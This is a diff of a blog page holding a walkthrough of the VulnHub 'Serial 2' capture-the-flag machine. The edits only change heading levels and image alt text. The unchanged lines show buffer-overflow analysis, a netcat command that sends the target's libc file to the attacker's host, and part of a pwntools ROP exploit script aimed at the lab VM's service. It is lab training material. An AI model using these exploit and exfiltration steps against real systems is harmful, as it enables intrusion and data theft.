@@ -157,7 +157,7 @@ Output of netdiscover.
 <li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/sk4,633/">sk4</a></li>
 <li><strong>Series</strong>: <a href="https://www.vulnhub.com/series/serial,231/">serial</a></li>
 </ul>
-<h1 id="initial-discovery">Initial Discovery</h1>
+<h2 id="initial-discovery">Initial Discovery</h2>
 <p><code>VMIP</code> is the VM’s IP Address</p>
 <p><code>LHIP</code> is the Local Host’s IP Address</p>
 <p>Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine.</p>
@@ -193,7 +193,7 @@ Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/mast
 <p>Further, several endpoints have been listed on the website. The <code>/api</code> discovered earlier has further endpoints.</p>
 <p><img src="https://hexterisk.github.io/blog/Serial_2/P2M-9D6rDzVmsPHrfwxbCWpB3mbKqjqIEwPhxN3yZmSZO0bqDY-ShZ9vuTySTyIsr3m149xKFyOI0LgfGGV0lA9rLtt_c_IzLTm2EKmZwQLHicayW2QCYVzRWdcGeHz9Sxd-uzhORs-xn_afrQ.dat" alt="&ldquo;api&rdquo;">
 <em>Listed endpoints.</em></p>
-<h1 id="hunting-begins">Hunting begins</h1>
+<h2 id="hunting-begins">Hunting begins</h2>
 <p>Let&rsquo;s checkout the weird service running on port 10000 first.</p>
 <p>Run <code>telnet 192.168.1.10 10000</code></p>
 <p>Format: <code>telnet VMIP 10000</code></p>
@@ -322,59 +322,59 @@ Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/mast
 <p>The password is validated and we get the root shell. However, it does not allow us to read the <code>flag.txt</code> file. The shell is clearly a restricted one.</p>
 <p>Similar thing happens when I try this tactic via the service on port 10000 from local host. Clearly there&rsquo;s more to the binary than we initially thought.</p>
 <p>We are now getting into the arena of binary exploitation. You could just skip ahead to the end and use the given script to pwn the service if you do not want to get into this section.</p>
-<h1 id="binary-exploitation">Binary Exploitation</h1>
+<h2 id="binary-exploitation">Binary Exploitation</h2>
 <p>We open the binary in IDA.</p>
 <p>The binary is short and sweet, and there&rsquo;s not much to it.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/10_image.png" alt="&ldquo;main&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/10_image.png" alt="">
 <em>The &ldquo;main&rdquo; function of the binary.</em></p>
 <p>We take a look at the <em>login</em> function here, since root password is all we desire. </p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/17_image.png" alt="&ldquo;login&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/17_image.png" alt="">
 <em>The &ldquo;login&rdquo; function of the binary.</em></p>
 <p>It turns out that the string we found indeed is the value against which are input is verified, though we still don&rsquo;t know if it is the root password. We therefore try to escalate to the root user via the shell of user <strong>sk4</strong>.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/11_image.png" alt="&ldquo;auth_fail&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/11_image.png" alt="">
 <em>Root user auth failure.</em></p>
 <p>But to no avail. It&rsquo;s settled then, the string we had found isn&rsquo;t the root user&rsquo;s password.</p>
 <p>Looking around in the <em>loop</em> function, I realise that the prompt we are presented with after entering the password is not that of a shell at all, it&rsquo;s just a case riddled input.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/13_image.png" alt="&ldquo;loop&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/13_image.png" alt="">
 <em>The &ldquo;loop&rdquo; function of the binary.</em></p>
 <p>We need to pwn the binary.</p>
 <p>We analyse the binary using GDB-Peda.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/18_image.png" alt="&ldquo;checksec&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/18_image.png" alt="">
 <em>Checking security measures applied on the binary.</em></p>
 <p>Clearly this binary is open to the existence of buffer overflow and GOT overwrite vulnerabilities. The binary is not a PIE binary, however the system is expected to have ASLR enabled. Since NX is enabled, we cannot push a shellcode on the stack. Rather, we would have to build a ROP chain for arbitrary code execution.</p>
 <p>This can be confirmed by checking the value in the file <strong>/proc/sys/kernel/randomize_va_space</strong>.</p>
 <p>Run <code>cat /proc/sys/kernel/randomize_va_space</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/19_image.png" alt="&ldquo;aslr&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/19_image.png" alt="">
 <em>ASLR enabled.</em></p>
 <p>Since PIE is_ disabled, only the base address of <code>libc</code> will be randomised, while the base address of the binary will remain constant. And since the offset of different sections of the binary are constant, we can find the address of a frequently occuring function like <code>puts</code> or <code>gets</code> in the <code>plt section</code> and use it to leak the address of <code>libc</code>. The library is in **/lib/x86_64-linux-gnu/** in modern 64-bit standard distributions by default.</p>
 <p>Start a new listener and redirect all the data received on it into a file.</p>
 <p>Run <code>nc -nlvp 1337 &gt; libc.so.6</code></p>
 <p>Format: <code>nc -nlvp PORT &gt; LIBNAME</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/21_image.png" alt="&ldquo;local_listener&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/21_image.png" alt="">
 <em>Pipe all input from the listener to file.</em></p>
 <p>Pipe all bytes from the file into the listener.</p>
 <p>Run <code>cat /lib/x86_64-linux-gnu/libc.so.6 | nc 192.168.1.6 1337</code></p>
 <p>Format: <code>cat /lib/x86_64-linux-gnu/libc.so.6 | nc LHIP PORT</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/22_image.png" alt="&ldquo;connect_listener&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/22_image.png" alt="">
 <em>Send all bytes of the file to the listener.</em></p>
 <p>Set the <strong>LD_LIBRARY_PATH</strong> environment variable to the path of this library to ensure that the binary uses this particular libc.</p>
 <p>Analysing the binary, I found a buffer overflow vulnerability.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/16_image.png" alt="&ldquo;loop&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/16_image.png" alt="">
 <em>Buffer overflow vulnerability in the &ldquo;loop&rdquo; function of the binary.</em></p>
 <p>Playing with the input, I was able to cause a SIGSEGV through instruction pointer corruption.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/20_image.png" alt="&ldquo;sigsegv&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/20_image.png" alt="">
 <em>SIGSEGV encountered.</em></p>
 <p>The value stored in the instruction pointer at the time of the error is compared against the input provided, and it is found that the input buffer is only 72 bytes far from the saved return address on stack.</p>
 <p>We use the <strong>pwntools</strong> library to build our exploit script.</p>
 <p>Finding the relevant addresses:</p>
 <p>Run  <code>objdump -d -M intel backd00r | grep puts</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/23_image.png" alt="&ldquo;puts&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/23_image.png" alt="">
 <em>Address of puts@plt.</em></p>
 <p>Run <code>readelf -r backd00r | grep puts</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/25_image.png" alt="&ldquo;puts_libc&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/25_image.png" alt="">
 <em>Address of puts in libc.</em></p>
 <p>Run <code>ropper --file backd00r --search &quot;pop rdi&quot;</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_2/26_image.png" alt="&ldquo;gadget&rdquo;">
+<p><img src="https://hexterisk.github.io/blog/Serial_2/26_image.png" alt="">
 <em>Address of gadget.</em></p>
 <p>Following is the final script used to exploit the service:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
@@ -451,7 +451,7 @@ loop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009c9</
 <span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
     r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;192.168.1.10&#34;</span>, <span style="color:#ae81ff">10000</span>)
     exploit(r)
-</code></pre></div><p><img src="https://hexterisk.github.io/blog/Serial_2/27_image.png" alt="&ldquo;pwned&rdquo;">
+</code></pre></div><p><img src="https://hexterisk.github.io/blog/Serial_2/27_image.png" alt="">
 <em>Root flag.</em></p>
 
             </div>
